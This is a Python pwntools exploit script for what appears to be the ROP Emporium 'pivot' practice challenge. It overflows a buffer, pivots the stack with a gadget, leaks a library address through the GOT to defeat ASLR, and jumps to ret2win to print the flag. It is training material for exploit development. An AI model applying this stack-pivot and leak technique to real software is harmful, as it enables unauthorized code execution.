#!/usr/bin/env python3

from pwn import *

exe = ELF("pivot_patched")
libc = ELF("libpivot.so")

context.binary = exe
rop = ROP(exe)

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    payload = cyclic(100)
    r.sendline()
    r.sendlineafter(b'>', payload)
    r.wait()
    core = r.corefile
    stack = core.rsp
    rip = core.read(stack, 4)
    offset = cyclic_find(rip)

    r = conn()

    pivot = exe.symbols.usefulGadgets + 2
    footoff = 0x96a
    rtwoff = 0xa81

    r.recvuntil('pivot: ')
    pivotadd = int(r.recvline(), 16)

    payload = flat(exe.plt.foothold_function, rop.rdi.address, exe.got.foothold_function, exe.plt.puts, exe.symbols.main)
    r.sendline(payload)

    payload = flat(b'A'*offset, rop.rax.address, pivotadd, pivot)
    r.sendlineafter(b'>', payload)

    r.recvuntil('libpivot\n')
    leakstuff = r.recv()
    footleak = unpack(leakstuff[:6].ljust(8, b'\x00'))
    libcbase = footleak - footoff
    rtwadd = libcbase + rtwoff

    payload = flat(b'A'*offset, rtwadd)
    r.sendlineafter(b'>', payload)

    r.recvuntil('you!\n')
    flag = r.recvline()
    print(flag)

if __name__ == "__main__":
    main()
